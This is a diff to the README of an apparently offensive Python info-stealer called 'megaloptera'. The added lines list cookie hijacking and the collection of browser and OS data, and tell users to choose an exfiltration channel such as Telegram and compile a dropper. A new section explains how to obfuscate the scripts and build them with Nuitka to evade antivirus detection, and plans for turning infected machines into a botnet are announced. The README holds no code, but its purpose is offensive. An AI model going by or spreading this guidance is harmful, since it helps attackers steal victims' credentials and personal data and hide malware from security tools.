@@ -16,6 +16,9 @@ Is automate so you dont need to change it or to connect to anything, all informa
 - private navigation history
 - webcam shot
 - screenshots
+- cookie hijack
+- multipble information on the os
+- more browser information
   
 ## Installation
 ```
@@ -26,10 +29,14 @@ or click on auto-install-lib
 ```
 ## Usage
 1. Open to megaloptera.py
-2. Enter your dropbox api key
-3. start main.py
-4. now start main.py (it will transform megaloptera.py into exe file)
-5. Here we go
+2. Enter your evasion method (telegram, tunnel, server ...)
+3. Now you can use dropper.py modify it then compile to exe
+4. and the software is done
+
+## AV escape and exe conversion
+The main problem of megaloptera is that he get flagged by few av on virus total, 
+i recommand to firstly encrypt/obfucate the main scripts (https://pyob.oxyry.com/) then you can use 
+Nuitka to convert it to exe. I dont recommand to use pyinstaller since av easly flagged the build as a virus even though some of them are not
 
 ## I am currently working on a new versions of megaloptera wich will be uploaded in few weeks (might be days if i dont sleep)
 ## features
@@ -43,5 +50,4 @@ Megaloptera V2.0 will have the same features than the old one plus few ones:
 
 ## new functionnality
 Megaloptera v2.0 will also let you choose if you want to transform the infected machine into a botnet in order to have control on it for later operation.
-
 Moreover, i will implement a new way to retrieve data from an infected computer, it will be from encrypted server (more details/explication later)
